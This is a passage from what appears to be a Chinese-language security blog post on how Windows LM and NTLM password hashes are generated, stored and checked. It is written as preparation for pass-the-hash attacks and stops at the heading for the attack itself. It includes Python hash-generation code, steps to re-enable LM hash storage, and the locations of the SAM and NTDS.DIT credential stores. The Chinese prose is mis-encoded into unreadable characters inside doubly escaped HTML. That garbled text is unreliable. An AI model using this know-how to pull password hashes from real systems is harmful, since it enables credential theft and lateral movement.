&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# ç”¨æˆ·çš„å¯†ç è½¬æ¢ä¸ºå¤§å†™,å¹¶è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;upper&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;str_len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# å¯†ç ä¸è¶³14å­—èŠ‚å°†ä¼šç”¨0æ¥è¡¥å…¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;str_len&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# å›ºå®šé•¿åº¦çš„å¯†ç è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# æ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä½56bitï¼Œé•¿åº¦ä¸è¶³ä½¿ç”¨0åœ¨å·¦è¾¹è¡¥é½é•¿åº¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lstrip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0b&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rjust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lstrip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0b&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rjust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# å†åˆ†7bitä¸ºä¸€ç»„æœ«å°¾åŠ 0ï¼Œç»„æˆæ–°çš„ç¼–ç &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Zero_padding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Zero_padding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rstrip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;L&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rstrip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;L&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0000000000000000&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a2b_hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a2b_hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# ä¸Šæ­¥éª¤å¾—åˆ°çš„8byteäºŒç»„ï¼Œåˆ†åˆ«ä½œä¸ºDES keyä¸º&amp;#34;KGS!@#$%&amp;#34;è¿›è¡ŒåŠ å¯†ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;LM_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DesEncrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;KGS!@#$%&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t_1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;LM_2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DesEncrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;KGS!@#$%&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t_2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# å°†äºŒç»„DESåŠ å¯†åçš„ç¼–ç æ‹¼æ¥ï¼Œå¾—åˆ°æœ€ç»ˆLM HASHå€¼ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;LM&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LM_1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LM_2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LM&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å› ä¸ºåœ¨windows 7ä»¥ä¸Šçš„ç‰ˆæœ¬æ˜¯é»˜è®¤ä¸å¯ç”¨LM hashçš„ï¼Œæ‰€ä»¥è¦æ‰‹åŠ¨ä¿®æ”¹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gpedit.msc-è®¡ç®—æœºé…ç½®-Windows è®¾ç½®-å®‰å…¨è®¾ç½®-æœ¬åœ°ç­–ç•¥-å®‰å…¨é€‰é¡¹&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾åˆ°ç½‘ç»œå®‰å…¨ï¸° &lt;code&gt;ä¸è¦åœ¨ä¸‹æ¬¡æ›´æ”¹å¯†ç å­˜å‚¨ LAN ç®¡ç†å™¨çš„å“ˆå¸Œå€¼ï¼Œé€‰æ‹©å·²ç¦ç”¨&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ç³»ç»Ÿä¸‹ä¸€æ¬¡æ›´æ”¹å¯†ç åï¼Œå°±èƒ½å¤Ÿå¯¼å‡ºLM hashã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨æˆ‘æµ‹è¯•ç¯å¢ƒçš„ç³»ç»Ÿå‘ç°è¿™ä¸€é¡¹éƒ½é»˜è®¤å¯ç”¨è€Œä¸”ä¸èƒ½ä¿®æ”¹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;LM Hashçš„ç¼ºç‚¹&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;å¯†ç é•¿åº¦æœ€å¤§åªèƒ½ä¸º14ä¸ªå­—ç¬¦&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¯†ç ä¸åŒºåˆ†å¤§å°å†™(åŠ å¯†è¿‡ç¨‹ç»Ÿä¸€è½¬æ¢ä¸ºå¤§å†™,å¯¼è‡´çš„)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åŠ å¯†ç»“æœå16ä½ä¸ºaad3b435b51404ee,åˆ™è¯´æ˜å¯†ç å¼ºåº¦å°äº7ä½ã€‚(å¦‚æœä¸å¤Ÿ7ä½çš„è¯,åé¢éœ€è¦ç”¨0æ¥è¡¥å…¨)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ntlm-hash&#34;&gt;NTLM Hash&lt;/h3&gt;
&lt;p&gt;ä¸ºäº†è§£å†³LMåŠ å¯†å’Œèº«ä»½éªŒè¯æ–¹æ¡ˆä¸­å›ºæœ‰çš„å®‰å…¨å¼±ç‚¹ï¼ŒMicrosoft äº1993å¹´åœ¨Windows NT 3.1ä¸­å¼•å…¥äº†NTLMåè®®ã€‚&lt;/p&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´ä»Windows Vista å’Œ Windows Server 2008å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹åªå­˜å‚¨NTLM Hashï¼ŒLM Hashå°†ä¸å†å­˜åœ¨ã€‚å¦‚æœç©ºå¯†ç æˆ–è€…ä¸å‚¨è“„LM Hashçš„è¯ï¼Œæˆ‘ä»¬æŠ“åˆ°çš„LM Hashæ˜¯AAD3B435B51404EEAAD3B435B51404EEã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥åœ¨çœŸå®ç¯å¢ƒä¸­æˆ‘ä»¬çœ‹åˆ°æŠ“åˆ°LM Hashéƒ½æ˜¯AAD3B435B51404EEAAD3B435B51404EEï¼Œè¿™é‡Œçš„LM Hashå¹¶æ²¡æœ‰ä»·å€¼ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NTLM Hash ç”Ÿæˆè¿‡ç¨‹&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å…ˆå°†ç”¨æˆ·å¯†ç è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ã€‚&lt;/li&gt;
&lt;li&gt;å°†åå…­è¿›åˆ¶æ ¼å¼çš„å¯†ç è¿›è¡ŒUnicodeç¼–ç ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨MD4æ‘˜è¦ç®—æ³•å¯¹Unicodeç¼–ç æ•°æ®è¿›è¡ŒHashè®¡ç®—&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¯ä»¥ä½¿ç”¨pythonè¿›è¡Œç”Ÿæˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;import hashlib,binascii; print binascii.hexlify(hashlib.new(&amp;#34;md4&amp;#34;, &amp;#34;admin&amp;#34;.encode(&amp;#34;utf-16le&amp;#34;)).digest())&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;NTLM hashæœ¬åœ°çš„è®¤è¯&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å½“ç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±ä¹‹åï¼Œwindowsä¼šè®©&lt;strong&gt;winlogon&lt;/strong&gt;æ˜¾ç¤ºç™»é™†ç•Œé¢ï¼Œæ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ä¹‹åï¼Œä¼šå°†å°†å¯†ç äº¤ä»˜ç»™&lt;strong&gt;lsass&lt;/strong&gt;è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹ä¼šå°†æ˜æ–‡å¯†ç åŠ å¯†æˆNTLM hashï¼Œå†ä¸&lt;strong&gt;SAMæ•°æ®åº“&lt;/strong&gt;é‡Œå¯¹åº”çš„ç”¨æˆ·å¯†ç åšå¯¹æ¯”ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;winlogon(Windows logon process)windowsæ³¨å†Œè¿›ç¨‹ï¼šæ˜¯windows NT ç”¨æˆ·çš„ç™»é™†ç¨‹åºï¼Œç”¨äºç®¡ç†ç”¨æˆ·çš„ç™»é™†ä¸é€€å‡º&lt;/li&gt;
&lt;li&gt;lsass( Local Security Authority Service): ç”¨äºæœ¬åœ°å®‰å…¨ä¸ç™»é™†ç­–ç•¥&lt;/li&gt;
&lt;li&gt;SAM(Security Account Manager å®‰å…¨è´¦æˆ·ç®¡ç†)ï¼šwindowsé‡‡ç”¨çš„è´¦æˆ·ç®¡ç†ç­–ç•¥ï¼Œè¿™ä¸ªç­–ç•¥ä¼šå°†æœ¬åœ°ç»„çš„ç”¨æˆ·çš„è´¦æˆ·å’ŒhashåŠ å¯†ä¹‹åä¿å­˜åˆ°SAMæ•°æ®åº“ä¸­ï¼ŒSAMæ•°æ®åº“æ–‡ä»¶è·¯å¾„æ˜¯&lt;code&gt;%systemroot%\system32\config\SAM&lt;/code&gt;æ–‡ä»¶&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ¬æœºçš„ç”¨æˆ·å¯†ç hashæ˜¯æ”¾åœ¨æœ¬åœ°çš„SAMæ–‡ä»¶é‡Œé¢ï¼ŒåŸŸå†…ç”¨æˆ·çš„å¯†ç hashå­˜åœ¨åŸŸæ§çš„NTDS.DITæ–‡ä»¶çš„ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å…³äºNTLMçš„è®¤è¯åè®®è¿™é‡Œå°±ä¸å†å…·ä½“å±•å¼€äº†ï¼Œå¯ä»¥æŸ¥é˜…&lt;a href=&#34;https://www.anquanke.com/post/id/193149&#34;&gt;Windowså†…ç½‘åè®®å­¦ä¹ NTLMç¯‡ä¹‹NTLMåŸºç¡€ä»‹ç»&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œåªè¦æˆ‘ä»¬çŸ¥é“LM Hashå·²ç»ä¸åœ¨æ–°çš„ç³»ç»Ÿä¸­ä½¿ç”¨äº†ï¼Œæˆ‘ä»¬pthä¸»è¦çš„æ”»å‡»æ˜¯é’ˆå¯¹NTLM Hashã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x02-å®æˆ˜&#34;&gt;0x02 å®æˆ˜&lt;/h1&gt;
&lt;h2 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯&lt;/h2&gt;
